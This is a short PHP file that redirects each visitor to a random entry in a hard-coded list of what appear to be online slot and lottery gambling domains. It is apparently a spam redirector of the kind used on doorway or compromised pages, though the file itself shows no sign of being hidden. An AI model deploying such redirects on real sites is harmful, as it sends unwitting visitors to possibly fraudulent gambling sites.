<?php
// Array of URLs to redirect to
$urls = [
    'https://sateslot77.online',
    'https://buditogel4d.shop',
    'https://megaforwingacor.xyz',
    'https://nasgorbetseafood.shop',
    // Add more URLs here
];

// Pick a random URL from the array
$random_url = $urls[array_rand($urls)];

// Redirect to the selected URL
header("Location: $random_url");
exit();
?>
